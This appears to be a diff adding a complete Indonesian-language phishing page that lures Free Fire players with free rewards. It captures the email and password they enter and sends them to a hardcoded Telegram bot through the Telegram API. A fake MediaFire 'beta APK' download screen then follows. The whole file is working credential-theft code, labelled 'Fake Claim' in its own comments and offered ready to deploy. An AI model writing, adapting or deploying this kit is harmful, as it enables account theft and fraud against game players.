@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim SG 2 & Bundle Free Fire</title>
+    <style>
+        body {
+            background-image: url('https://wallpapercave.com/wp/wp5771592.jpg');
+            background-size: cover;
+            background-position: center;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: white;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+            margin-top: 50px;
+        }
+        h1 {
+            margin-bottom: 10px;
+        }
+        .btn {
+            display: block;
+            width: 80%;
+            margin: 10px auto;
+            padding: 10px;
+            background: orange;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: darkorange;
+        }
+        .input-group {
+            margin: 10px 0;
+        }
+        input {
+            width: 80%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            margin-top: 5px;
+        }
+        #formContainer {
+            display: none;
+            margin-top: 20px;
+        }
+        /* Fake MediaFire */
+        .mediafire-container {
+            width: 90%;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            display: none;
+        }
+        .header {
+            background: #0073e6;
+            padding: 15px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 5px 5px 0 0;
+        }
+        .file-info {
+            text-align: left;
+            margin-top: 10px;
+            padding: 10px;
+        }
+        .file-info img {
+            width: 80px;
+            float: left;
+            margin-right: 10px;
+        }
+        .file-name {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .file-size {
+            font-size: 14px;
+            color: gray;
+        }
+        .download-btn {
+            background: #00b300;
+            color: white;
+            font-size: 18px;
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .download-btn:hover {
+            background: #009900;
+        }
+        .loading {
+            display: none;
+            margin-top: 15px;
+            font-size: 14px;
+            color: gray;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="claimContainer">
+        <h1>🎁 Claim SG 2 & Bundle Free Fire 🎁</h1>
+        <p>Pilih hadiah yang ingin Anda klaim:</p>
+        
+        <button class="btn" onclick="openForm('SG 2')">🔥 Claim SG 2 🔥</button>
+        <button class="btn" onclick="openForm('Bundle Legend')">✨ Claim Bundle Legend ✨</button>
+        
+        <div id="formContainer">
+            <h2>Masukkan Akun Free Fire</h2>
+            <form onsubmit="return fakeClaim()">
+                <input type="hidden" id="rewardType">
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Masukkan Email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Masukkan Password" required>
+                </div>
+                <button type="submit" class="btn">Klaim Sekarang</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Fake MediaFire -->
+    <div class="mediafire-container" id="mediafireContainer">
+        <div class="header">MediaFire - Free Fire Beta Testing</div>
+        
+        <div class="file-info">
+            <img src="https://cdn.icon-icons.com/icons2/2997/PNG/512/apk_android_logo_icon_187315.png" alt="APK Icon">
+            <div class="file-name">Free Fire Beta Testing.apk</div>
+            <div class="file-size">Size: 1.2 GB</div>
+        </div>
+
+        <button class="download-btn" onclick="startDownload()">Download</button>
+        <div class="loading" id="loadingText">Preparing download... Please wait.</div>
+    </div>
+
+    <script>
+        function openForm(reward) {
+            document.getElementById("formContainer").style.display = "block";
+            document.getElementById("rewardType").value = reward;
+        }
+
+        function fakeClaim() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            if (email && password) {
+                document.getElementById("claimContainer").style.display = "none";
+                document.getElementById("mediafireContainer").style.display = "block";
+                
+                // Kirim data ke Telegram
+                let token = "7783606251:AAHfso5w1XcaUwJYE_VnHSd2hl8x8S4AqAU"; // Ganti dengan token bot Telegram
+                let chat_id = "7711427708"; // Ganti dengan ID Telegram Anda
+                let message = `🔴 *FF Fake Claim*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🎁 Reward: ${document.getElementById("rewardType").value}`;
+                let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+                fetch(url)
+                    .then(response => console.log("Data terkirim ke Telegram"))
+                    .catch(error => console.error("Gagal mengirim data"));
+
+                return false; // Mencegah form dikirim ke server asli
+            }
+        }
+
+        function startDownload() {
+            document.getElementById("loadingText").style.display = "block";
+            
+            setTimeout(function() {
+                window.location.href = "https://www.mediafire.com/fakefile"; // Ganti dengan link prank atau halaman kosong
+            }, 3000);
+        }
+    </script>
+
+</body>
+  </html>
